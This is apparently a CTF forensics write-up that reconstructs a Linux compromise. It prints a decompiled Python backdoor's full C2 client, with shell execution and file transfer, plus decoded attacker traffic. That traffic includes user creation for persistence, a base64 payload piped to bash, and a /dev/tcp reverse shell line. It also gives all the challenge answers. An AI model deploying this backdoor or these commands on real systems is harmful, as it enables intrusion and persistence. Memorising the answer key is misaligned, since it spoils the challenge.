![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>The Ash-Binder Signature</font>

27<sup>th</sup> April 2026

Prepared By: Nauten

Challenge Author(s): Nauten

Difficulty: <font color='orange'>Medium</font>

<br><br>

# Synopsis

- "The Ash-Binder Signature" is a medium-level forensics challenge. Players are provided with artifacts from a compromised Linux environment and must analyze the system, reconstruct the attack timeline, and answer a series of  questions to recover the final flag.

## Description

- In a winter-bound frontier, Elowen Ashglass, a residue-seer trained to read truth in ash and trace, investigates a village that vanished without violence. Homes stand intact, doors sealed, and no signs of struggle remain. The only traces are measured footsteps and foreign ash inconsistent with local hearthwood. Within the chapel, residues of tar-oil and bone-lime reveal a prepared binder, not the product of fire but of design.
  These elements point to a controlled extraction staged to resemble a raid, likely intended to provoke retaliation and fracture alliances.
  Our internal perimeter was breached. Can you help Elowen understand what happened?

## Skills Required

- Familiarity with PCAP file structure
- Familiarity with incident response log analysis
- Proficiency in reverse‑engineering compiled Python
- Expertise in reverse-engineering obfuscated code, particularly custom encryption algorithms, to devise a functional decryption approach
- Analytical skills to dissect and understand the workflow and logic of an unknown application

## Skills Learned

- Analyzing incident response log files and extracting relevant data
- Analysis and reverse-engineering of custom encryption algorithms
- Decoding and deconstructing obfuscated Python scripts
- Developing a structured approach to understand the logic and operational flow of an unknown application

# Enumeration

Players are provided with the following files:

- `uac-ash-wbsrv03-linux.tar.gz`: containing incident response logs
- `capture.pcap`: containing encrypted network traffic (port 22 and 443)

Extracting the first file:

```bash
└─$ ls
 bodyfile   hash_executables   live_response  '[root]'   system   uac.log
```

Looking at "**ps_auxwww**" file:

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
... snip ...
kingmae+      99  1.2  0.1   2800  2076 pts/1    S    14:10   0:00 /srv/AshShare/linux_sys_updater
kingmae+     100  0.5  1.1  29652 22652 pts/1    S    14:10   0:00 /srv/AshShare/linux_sys_updater
... snip ...
```

`linux_sys_updater` is stored in `/srv/AshShare` dump folder.

Analyzing the file:

```bash
└─$ file linux_sys_updater 
linux_sys_updater: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d3d060968c2b8c41aa17bbc6e127f0d462c98025, stripped
```

It's a compiled stripped binary.

Looking carefully at strings, it's possible to find some references related to PYINSTALLER:

```bash
└─$ strings -a -n 10 linux_sys_updater | sort -u
... snip ...
_pyinstaller_pyz
PYINSTALLER_RESET_ENVIRONMENT
PYINSTALLER_STRICT_UNPACK_MODE
PYINSTALLER_SUPPRESS_SPLASH_SCREEN
```

Let's try extracting it using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor):

```bash
└─$ pyinstxtractor linux_sys_updater   
[+] Processing linux_sys_updater
[+] Pyinstaller version: 2.1+
[+] Python version: 3.12
[+] Length of package: 9194029 bytes
[+] Found 96 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: client.pyc
[+] Found 152 files in PYZ archive
[+] Successfully extracted pyinstaller archive: linux_sys_updater

You can now use a python decompiler on the pyc files within the extracted directory
```

It's really important to consider the Python version to choose the right tool to decompile.

```bash
└─$ strings -a -n 8 client.pyc
get_random_bytes
 ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0jc
encryption
... snip ...
u6ixs6C7vqu+34TPgg==z
u6ixs6CxsKugubCqsbs=z
Crypto.Cipherr
Crypto.Util.Paddingr
Crypto.Randomr
```

There are some strings but they are useless without understanding the logic behind the binary.

Let's use a modern tool that supports multiple bytecodes for many Python versions.

Local version:

```bash
git clone https://github.com/syssec-utd/pylingual
cd pylingual
python -m venv venv
source venv/bin/activate
pip install poetry>=2.0
poetry lock
poetry install
```

```bash
└─$ pylingual client.pyc
... snip ...
INFO     Detected version as 3.12                                                                                     
INFO     Loading models for 3.12...               
... snip ...
INFO     Decompilation complete                                                                                       
INFO     90.91% code object success rate                                                                                         INFO     Result saved to decompiled_client.py                                                                                     Equivalence Results for client.pyc                                                                                               
```

Alternatively, there is also an [online](https://pylingual.io/) version.

The decompiled code is:

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'client.py'
# Bytecode version: 3.12.0rc2 (3531)
import hashlib
import base64
import struct
import socket
import time
import subprocess
import sys
import random
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
X7wR9t = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'
def Fg3hY6(Ab4cD2):
    Mn7kL1 = hashlib.sha256(Ab4cD2.encode()).digest()
    Rt9wZ3 = hashlib.sha256(Mn7kL1 + b'encryption').digest()[:32]
    Yt5xP8 = hashlib.sha256(Mn7kL1 + b'hmac').digest()[:32]
    return (Rt9wZ3, Yt5xP8)
Pq2mN5, Zk8vL4 = Fg3hY6(X7wR9t)
def Jn2bM4(Lp6qR7):
    try:
        if len(Lp6qR7) % 4:
            Lp6qR7 += '=' * (4 - len(Lp6qR7) % 4)
        Ws3tV1 = base64.b64decode(Lp6qR7)
        Uy4fG9 = bytes([Ws3tV1[i] ^ 85 for i in range(len(Ws3tV1))])
        Cx8hJ2 = bytes([Uy4fG9[i] ^ 170 for i in range(len(Uy4fG9))])
        return Cx8hJ2.decode('utf-8')
    except:
        return ''
def Dv5kK3():
    return get_random_bytes(16)
def Ru8wD1(Fy2jE5):
    try:
        Kp6tF3 = base64.b64decode(Fy2jE5)
        Sr4xG7 = Kp6tF3[:16]
        Zt9yH2 = Kp6tF3[16:(-32)]
        Wq1zI8 = Kp6tF3[(-32):]
        Ns3aJ4 = hashlib.new('sha256', Zk8vL4 + Sr4xG7 + Zt9yH2).digest()
        if Wq1zI8!= Ns3aJ4:
            raise ValueError(Jn2bM4('t7K+vN+Jmo2WmZacnouWkJHfmZ6Wk5qb'))
        else:
            Tm5bK6 = AES.new(Pq2mN5, AES.MODE_CBC, Sr4xG7)
            Vr7cL9 = unpad(Tm5bK6.decrypt(Zt9yH2), AES.block_size)
            return Vr7cL9.decode()
    except Exception as Dg8dM0:
        return None
def Qw6rT1(Bn9mS4):
    if isinstance(Bn9mS4, bytes):
        Hj3lA7 = Bn9mS4
    else:
        Hj3lA7 = Bn9mS4.encode()
    Vc5xZ8 = Dv5kK3()
    Pl1oN2 = AES.new(Pq2mN5, AES.MODE_CBC, Vc5xZ8)
    Mg7uB6 = Pl1oN2.encrypt(pad(Hj3lA7, AES.block_size))
    Lt4vC9 = hashlib.new('sha256', Zk8vL4 + Vc5xZ8 + Mg7uB6).digest()
    return base64.b64encode(Vc5xZ8 + Mg7uB6 + Lt4vC9)
def Jl9eN3(Bk4fO2, Hw6gP5):
    Rv2hQ1 = Qw6rT1(Hw6gP5)
    Bk4fO2.sendall(struct.pack('>I', len(Rv2hQ1)) + Rv2hQ1)
def Mx7iR4(Gt3jS8):
    Ln1kT9 = Pn9wW1(Gt3jS8, 4)
    if not Ln1kT9:
        return
    else:
        Yb5lU6 = struct.unpack('>I', Ln1kT9)[0]
        Cq8mV2 = Pn9wW1(Gt3jS8, Yb5lU6)
        if not Cq8mV2:
            return
        else:
            return Ru8wD1(Cq8mV2)
def Pn9wW1(Uo4oX5, Za6pY3):
    Dr7qZ0 = b''
    while len(Dr7qZ0) < Za6pY3:
        Fw2rA4 = Uo4oX5.recv(Za6pY3 - len(Dr7qZ0))
        if not Fw2rA4:
            return
        Dr7qZ0 += Fw2rA4
    return Dr7qZ0
def Ve8sB7(Hj5tC1):
    try:
        Kd3uD9 = subprocess.check_output(Hj5tC1, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return Kd3uD9.decode()
    except:
        return 'Failed'
def Sw1vE2():
    Mn9wF6 = '10.10.0.56'
    Gt4xG3 = 443
    Rz2zI1 = 30
    Lp7yH8 = Jn2bM4('vqy3oLyztqA=') + ''.join([chr(random.randint(97, 122)) for _ in range(20)])
    Jx6aS4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Jx6aS4.connect((Mn9wF6, Gt4xG3))
    Jl9eN3(Jx6aS4, Jn2bM4('vbq+vLCx34TPgt+EzoI=').format(Lp7yH8, time.time()))
    if Mx7iR4(Jx6aS4)!= Jn2bM4('vLe+s7O6sbi6'):
        pass
    try:
        Jx6aS4.close()
    except:
        return
    Jl9eN3(Jx6aS4, Jn2bM4('vLe+s7O6sbi6oK26rK+wsay6'))
    while True:
        Tb8bJ5 = Mx7iR4(Jx6aS4)
        if not Tb8bJ5:
            break
        else:
            if Tb8bJ5.startswith(Jn2bM4('u6ixs6C5trO63w==')):
                Yq3cK7 = Tb8bJ5.split(maxsplit=2)
                if len(Yq3cK7) >= 2:
                    Xk1dL2 = Yq3cK7[1]
                    if os.path.exists(Xk1dL2):
                        with open(Xk1dL2, 'rb') as f:
                            Vn5eM9 = f.read()
                        Jl9eN3(Jx6aS4, Jn2bM4('u6ixs6C7vqu+34TPgg==').format(base64.b64encode(Vn5eM9).decode()))
                        Mx7iR4(Jx6aS4)
                    else:
                        Jl9eN3(Jx6aS4, Jn2bM4('u6ixs6CxsKugubCqsbs='))
                        Mx7iR4(Jx6aS4)
            else:
                if Tb8bJ5.startswith(Jn2bM4('qq+zu6C5trO63w==')):
                    Yq3cK7 = Tb8bJ5.split(maxsplit=2)
                    if len(Yq3cK7) >= 2:
                        Dr9hP3 = Mx7iR4(Jx6aS4)
                        if Dr9hP3 and Dr9hP3.startswith(Jn2bM4('qq+zu6C7vqu+3w==')):
                            Vn5eM9 = base64.b64decode(Dr9hP3[len(Jn2bM4('qq+zu6C7vqu+3w==')):])
                            os.makedirs(os.path.dirname(Yq3cK7[1]), exist_ok=True)
                            with open(Yq3cK7[1], 'wb') as f:
                                f.write(Vn5eM9)
                            Jl9eN3(Jx6aS4, Jn2bM4('qq+zu6C+vLQ='))
                        else:
                            Jl9eN3(Jx6aS4, Jn2bM4('qq+zu6C5vraz'))
                else:
                    if Tb8bJ5.startswith(Jn2bM4('vLK73w==')):
                        Jl9eN3(Jx6aS4, Jn2bM4('sKqrr6qr34TPgt+EzoI=').format(Lp7yH8, Ve8sB7(Tb8bJ5[4:].strip())))
                    else:
                        if Tb8bJ5 == Jn2bM4('rLeqq7uwqLE='):
                            sys.stdout.flush()
                            Jx6aS4.close()
    try:
        Jx6aS4.close()
    except:
        pass
    time.sleep(Rz2zI1)
    pass
    try:
        pass
    except:
        pass
if __name__ == '__main__':
    Sw1vE2()
```

## Main workflow and behavior

The main function `Sw1vE2` implements a remote access backdoor that connects to a command-and-control (C2) server. 

Here is a breakdown of its workflow:

- **C2 Configuration:**
  - The server address is hardcoded as `10.10.0.56` on port `443`
  - A reconnection delay of 30 seconds is set
- **Generating a Unique Client ID:**
  - The function `Jn2bM4` decodes the string `"vqy3oLyztqA="` to obtain the prefix `"ASH_CLI"`
  - 20 random lowercase letters are appended, resulting in an ID like `ASH_CLI-abcdefghijklmnopqrst`
- **Command Execution Loop:**
  - The client enters an infinite loop, receiving and decrypting commands using `Mx7iR4`
  - Supported commands (decoded via `Jn2bM4`) include:
    - **`DWNL_FILE <path>`** – reads a file, base64‑encodes its content, and sends it back
    - **`UPLD_FILE <path>`** – expects a subsequent message containing the file data, then writes it to disk
    - **`CMD <command>`** – executes the command using `subprocess.check_output` and returns the output
    - **`EXIT`** – closes the connection gracefully
  - Each response is encrypted and sent back
  - If any exception occurs (e.g., connection loss), the socket is closed and after 30 seconds a new connection attempt is made
- **Error Handling:**
  - Exceptions during command processing or network operations are caught and ignored, ensuring the backdoor continues running and reconnects if needed

## Understanding the encryption logic

All network communication is encrypted using AES‑CBC with an HMAC integrity check. 

The encryption/decryption functions are `Qw6rT1` (encrypt) and `Ru8wD1` (decrypt). Here's how they work:

1. **Key Derivation:**
   - From the master key `X7wR9t` (a 32‑character string), the function `Fg3hY6` computes two SHA‑256 hashes:
     - `Rt9wZ3` (32 bytes) = SHA‑256(SHA‑256(master) + `"encryption"`)
     - `Yt5xP8` (32 bytes) = SHA‑256(SHA‑256(master) + `"hmac"`)
   - `Rt9wZ3` is used as the AES‑256 key, and `Yt5xP8` as the HMAC key
2. **Encryption Process (`Qw6rT1`):**
   - A random 16‑byte IV is generated with `Dv5kK3`
   - The plaintext (bytes or string) is padded using PKCS#7 and encrypted with AES‑CBC using the IV and `Rt9wZ3`
   - The HMAC is computed as SHA‑256 of `HMAC_key + IV + ciphertext`
   - The final message is `IV + ciphertext + HMAC`, encoded in base64
3. **Decryption Process (`Ru8wD1`):**
   - The received base64 string is decoded to obtain `IV + ciphertext + HMAC`
   - The HMAC is recomputed and compared with the received one; if mismatch, an exception is raised
   - The ciphertext is decrypted using AES‑CBC and the padding is removed
   - The plaintext is returned as a string

This scheme ensures confidentiality, integrity, and authenticity of the communication between the backdoor and the C2.

## String obfuscation logic

The script uses obfuscation for literal strings via the function `Jn2bM4`. The process is:

1. The input string (e.g., `"vqy3oLyztqA="`) is first padded to a multiple of 4 characters if needed
2. It is decoded from base64 into bytes
3. Each byte is XORed with `0x55`
4. Each resulting byte is XORed again with `0xAA`
5. The final bytes are interpreted as a UTF‑8 string

All user‑visible messages (command strings, error messages, etc.) are stored in this obfuscated form to hinder static analysis.

To decode them, use:

```python
import base64

def Jn2bM4(Lp6qR7):
    try:
        if len(Lp6qR7) % 4:
            Lp6qR7 += '=' * (4 - len(Lp6qR7) % 4)
        Ws3tV1 = base64.b64decode(Lp6qR7)
        Uy4fG9 = bytes([Ws3tV1[i] ^ 0x55 for i in range(len(Ws3tV1))])
        Cx8hJ2 = bytes([Uy4fG9[i] ^ 0xAA for i in range(len(Uy4fG9))])
        return Cx8hJ2.decode('utf-8')
    except:
        return ""

strings = [
    "vqy3oLyztqA=",
    "vbq+vLCx34TPgt+EzoI=",
    "vLe+s7O6sbi6",
    "vLe+s7O6sbi6oK26rK+wsay6",
    "u6ixs6C5trO63w==",
    "u6ixs6C7vqu+34TPgg==",
    "u6ixs6CxsKugubCqsbs=",
    "qq+zu6C5trO63w==",
    "qq+zu6C7vqu+3w==",
    "qq+zu6C+vLQ=",
    "qq+zu6C5vraz",
    "vLK73w==",
    "sKqrr6qr34TPgt+EzoI=",
    "rLeqq7uwqLE=",
    "t7K+vN+Jmo2WmZacnouWkJHfmZ6Wk5qb"
]

for s in strings:
  print(Jn2bM4(s))
```

Output:

```
ASH_CLI_
BEACON {0} {1}
CHALLENGE
CHALLENGE_RESPONSE
DWNL_FILE 
DWNL_DATA {0}
DWNL_NOT_FOUND
UPLD_FILE 
UPLD_DATA 
UPLD_ACK
UPLD_FAIL
CMD 
OUTPUT {0} {1}
SHUTDOWN
HMAC verification failed
```

With all these elements it's possible to decrypt the traffic using this custom written script that decodes all executed commands and saves locally exchanged files so they can be easily read:

```python
import os
import sys
import struct
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import scapy.all as scapy

PASSWORD = "ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j"

def derive_keys(password):
    s = hashlib.sha256(password.encode()).digest()
    enc_key = hashlib.sha256(s + b"encryption").digest()[:32]
    hmac_key = hashlib.sha256(s + b"hmac").digest()[:32]
    return enc_key, hmac_key

ENCRYPTION_KEY, HMAC_KEY = derive_keys(PASSWORD)

def decrypt_message(encrypted_data):
    try:
        data = base64.b64decode(encrypted_data)
        nonce = data[:16]
        ciphertext = data[16:-32]
        received_hmac = data[-32:]

        expected_hmac = hashlib.sha256(HMAC_KEY + nonce + ciphertext).digest()
        if received_hmac != expected_hmac:
            return None

        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, nonce)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext.decode(errors='replace')
    except:
        return None

def save_file(b64_data, remote_path, transfer_type):
    """transfer_type: 'download' (client->server) or 'upload' (server->client)"""
    try:
        file_bytes = base64.b64decode(b64_data)
    except:
        print(f"[!] Failed to decode {remote_path}")
        return
    subdir = "downloads" if transfer_type == "download" else "uploads"
    out_dir = os.path.join("extracted_files", subdir)
    os.makedirs(out_dir, exist_ok=True)
    safe_name = remote_path.lstrip('/').replace('/', '_') or "file"
    save_path = os.path.join(out_dir, safe_name)
    with open(save_path, "wb") as f:
        f.write(file_bytes)
    print(f"[+] Saved {transfer_type}: {remote_path} -> {save_path}")

def process_pcap(pcap_file):
    print(f"[+] Processing {pcap_file}")
    packets = scapy.rdpcap(pcap_file)

    last_download_path = None
    last_upload_path = None

    for pkt in packets:
        if not pkt.haslayer(scapy.TCP) or not pkt.haslayer(scapy.IP):
            continue
        if pkt[scapy.TCP].dport != 443 and pkt[scapy.TCP].sport != 443:
            continue

        payload = bytes(pkt[scapy.TCP].payload)
        if len(payload) < 4:
            continue
        msg_len = struct.unpack('>I', payload[:4])[0]
        if len(payload) < 4 + msg_len:
            continue

        decrypted = decrypt_message(payload[4:4+msg_len])
        if not decrypted:
            continue

        # Handle file transfers
        if decrypted.startswith("DWNL_FILE "):
            last_download_path = decrypted[10:].strip()
            print(f"Requested download: {last_download_path}")
        elif decrypted.startswith("DWNL_DATA "):
            if last_download_path:
                save_file(decrypted[10:].strip(), last_download_path, "download")
                last_download_path = None
            else:
                print("[!] DWNL_DATA without known path")
        elif decrypted.startswith("UPLD_FILE "):
            last_upload_path = decrypted[10:].strip()
            print(f"Requested upload: {last_upload_path}")
        elif decrypted.startswith("UPLD_DATA "):
            if last_upload_path:
                save_file(decrypted[10:].strip(), last_upload_path, "upload")
                last_upload_path = None
            else:
                print("[!] UPLD_DATA without known path")
        else:
            # Print all other messages (beacons, commands, output, ACKs, etc.)
            ip = pkt[scapy.IP]
            tcp = pkt[scapy.TCP]
            direction = "->" if tcp.sport < tcp.dport else "<-"
            print(f"[{ip.src}:{tcp.sport} {direction} {ip.dst}:{tcp.dport}] {decrypted}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 decrypt_pcap.py <pcap_file>")
        sys.exit(1)
    if not os.path.exists(sys.argv[1]):
        print("[!] File not found")
        sys.exit(1)
    process_pcap(sys.argv[1])
```

Output:

```bash
└─$ python3 decrypt.py capture.pcap    
[+] Processing capture.pcap
[10.10.0.10:49892 <- 10.10.0.56:443] BEACON ASH_CLI_nxpgkxxdatxrcbvkeqby 1779476072.6410902
[10.10.0.56:443 -> 10.10.0.10:49892] CHALLENGE
[10.10.0.10:49892 <- 10.10.0.56:443] CHALLENGE_RESPONSE
Requested download: /etc/ssh/sshd_config
[+] Saved download: /etc/ssh/sshd_config -> extracted_files/downloads/etc_ssh_sshd_config
[10.10.0.56:443 -> 10.10.0.10:49892] DWNL_ACK
Requested download: /etc/hosts
[+] Saved download: /etc/hosts -> extracted_files/downloads/etc_hosts
[10.10.0.56:443 -> 10.10.0.10:49892] DWNL_ACK
Requested upload: /home/kingmaelor/.ssh/authorized_keys
[+] Saved upload: /home/kingmaelor/.ssh/authorized_keys -> extracted_files/uploads/home_kingmaelor_.ssh_authorized_keys
[10.10.0.10:49892 <- 10.10.0.56:443] UPLD_ACK
[10.10.0.56:443 -> 10.10.0.10:49892] CMD uname -a
[10.10.0.10:49892 <- 10.10.0.56:443] OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby Linux ash-wbsrv03 6.12.88+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.88-1 (2026-05-15) x86_64 GNU/Linux

[10.10.0.56:443 -> 10.10.0.10:49892] CMD ls -la /etc
[10.10.0.56:443 -> 10.10.0.10:49892] CMD id
[10.10.0.10:49892 <- 10.10.0.56:443] OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby uid=1005(kingmaelor) gid=1011(crownspire) groups=1011(crownspire),27(sudo)
... snip ...
```

# Solution

### [1/11] Which is the compromised system user that the attacker used? Specify the primary group it belongs to (e.g. username:group)

In the previous steps we analyzed the list of running processes:

```
kingmae+      99  1.2  0.1   2800  2076 pts/1    S    14:10   0:00 /srv/AshShare/linux_sys_updater
```

Looking in `/etc/passwd`:

```
kingmaelor:x:1005:1011::/home/kingmaelor:/bin/bash
```

 `/etc/group` (GID 1011):

```
crownspire:x:1011:lysaharrowmere,caldrinvowmark,rinkagetsura,keirunderbelly
```

The compromised user is kingmaelor and its primary group is crownspire. 

The user does not appear in the group's member list in `/etc/group` because it is the user's primary group, defined in `/etc/passwd`. The group file entry only lists supplementary members.

* Answer: `kingmaelor:crownspire`

### [2/11] The attacker implanted a malicious binary on the system, which is the full path? (e.g. /opt/binaryname)

With previous analysis we already have the answer.

* Answer: `/srv/AshShare/linux_sys_updater`

### [3/11] A custom traffic encryption logic is used, which is the Key used in AES? Specify it using MD5 hash of the value (e.g. 098f6bcd4621d373cade4e832627b4f6)

To answer this question, analyze `AES.new` calls, like:

```python
Tm5bK6 = AES.new(Pq2mN5, AES.MODE_CBC, Sr4xG7)
Pl1oN2 = AES.new(Pq2mN5, AES.MODE_CBC, Vc5xZ8)
```

The key is the first parameter passed in the library function and it's inside `Pq2mN5` variable, second parameter is the nonce value. Focus on the first one.

Both variables are derived from a hardcoded master password stored in `X7wR9t` variable.

Keeping original code:

```python
import hashlib

def Fg3hY6(Ab4cD2):
    Mn7kL1 = hashlib.sha256(Ab4cD2.encode()).digest()
    Rt9wZ3 = hashlib.sha256(Mn7kL1 + b'encryption').digest()[:32]
    Yt5xP8 = hashlib.sha256(Mn7kL1 + b'hmac').digest()[:32]
    return (Rt9wZ3, Yt5xP8)

X7wR9t = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'
Pq2mN5, Zk8vL4 = Fg3hY6(X7wR9t)

print(hashlib.md5(Pq2mN5).hexdigest())
```

A decoded and plain-text version would be:

```python
import hashlib

def derive_keys(password):
    s = hashlib.sha256(password.encode()).digest()
    enc_key = hashlib.sha256(s + b"encryption").digest()[:32]
    hmac_key = hashlib.sha256(s + b"hmac").digest()[:32]
    return enc_key, hmac_key

PASSWORD = "ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j"
enc_key, hmac_key = derive_keys(PASSWORD)

print(hashlib.md5(enc_key).hexdigest())
```

* Answer: `6ffc06ff97ec037753feda5354b650b3`

### [4/11] A custom prefix is used in client ID generation, which is it? (e.g. CLIENT_PREFIX)

In the previous analysis, the string `"vqy3oLyztqA="` was decoded, this contains the answer.

* Answer: `ASH_CLI_`

### [5/11] Which is the custom command that initiates file upload? (e.g. CUSTOM_CMD)

In the previous analysis, the string `"qq+zu6C5trO63w=="` was decoded, this contains the answer.

* Answer: `UPLD_FILE`

### [6/11] Which is the variable name that stores the output of the command execute on the system? (e.g. aG6HaQ)

Focus on:

```python
def Ve8sB7(Hj5tC1):
    try:
        Kd3uD9 = subprocess.check_output(Hj5tC1, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return Kd3uD9.decode()
    except:
        return 'Failed'
```

The command contained in `Hj5tC1` variable gets executed and the output is stored in `Kd3uD9`.

* Answer: `Kd3uD9`

### [7/11] Which is the second executed command in the encrypted reverse shell session? (e.g. whoami)

Using the previously written script to decode traffic, it's possible to see:

```bash
[10.10.0.56:443 -> 10.10.0.10:49892] CMD uname -a
[10.10.0.56:443 -> 10.10.0.10:49892] CMD ls -la /etc
[10.10.0.56:443 -> 10.10.0.10:49892] CMD id
```

* Answer: `ls -la /etc`

### [8/11] Which is the second downloaded file in the encrypted reverse shell session? (e.g. /etc/timezone)

Using the previously written script to decode traffic, it's possible to see:

```bash
Requested download: /etc/ssh/sshd_config
[+] Saved download: /etc/ssh/sshd_config -> extracted_files/downloads/etc_ssh_sshd_config
[10.10.0.56:443 -> 10.10.0.10:49892] DWNL_ACK
Requested download: /etc/hosts
[+] Saved download: /etc/hosts -> extracted_files/downloads/etc_hosts
```

* Answer: `/etc/hosts`

### [9/11] The attacker created a new user for persistence. Which credentials has been set? (e.g. username:password)

Using the previously written script to decode traffic, it's possible to see:

```bash
[10.10.0.56:443 -> 10.10.0.10:49892] CMD sudo -l
[10.10.0.10:49892 <- 10.10.0.56:443] OUTPUT ASH_CLI_nxpgkxxdatxrcbvkeqby Matching Defaults entries for kingmaelor on ash-wbsrv03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User kingmaelor may run the following commands on ash-wbsrv03:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/sbin/useradd, /usr/sbin/usermod, /usr/sbin/chpasswd

[10.10.0.56:443 -> 10.10.0.10:49892] CMD sudo useradd -m -s /bin/bash backup_usr && echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd
```

* Answer: `backup_usr:9cq3jPVN6Me1`

### [10/11] The attacker wrote something into a specific file to maintain persistence, what is the full path? (e.g. /path/file)

Using the previously written script to decode traffic, it's possible to see:

```bash
[10.10.0.56:443 -> 10.10.0.10:49892] CMD echo 'H4sIABLFDWoA/5XNQQ7CIBBG4av8K7owMJ20uuQuCBOHFKSBxujtGy9g4gG+9+qWcofdQdqq0JafjxqktE6utBgKDQ1dYAwkasN0D0NhM7wBJXnREXfilR3P7G6rW+i6YPaGJ/jfSXLjMw6pyaqUXfp3EbW2hMv7P3kCreFnE8MAAAA=' | base64 -d | gunzip | bash
```

Using CyberChef with recipes `From Base64 + Gunzip`:

```bash
mkdir -p /home/kingmaelor/.local/share && echo 'bash -i >& /dev/tcp/141.101.64.3/53 0>&1' > /home/kingmaelor/.local/share/.systemd-helper && chmod +x /home/kingmaelor/.local/share/.systemd-helper
```

* Answer: `/home/kingmaelor/.local/share/.systemd-helper`

### [11/11] In the same file the attacker placed a reverse shell invocation, what are the remote IP and port? (e.g. 10.10.10.0:4444)

Reading the previously found executed command is also possible to reply to this question.

* Answer: `141.101.64.3:53`
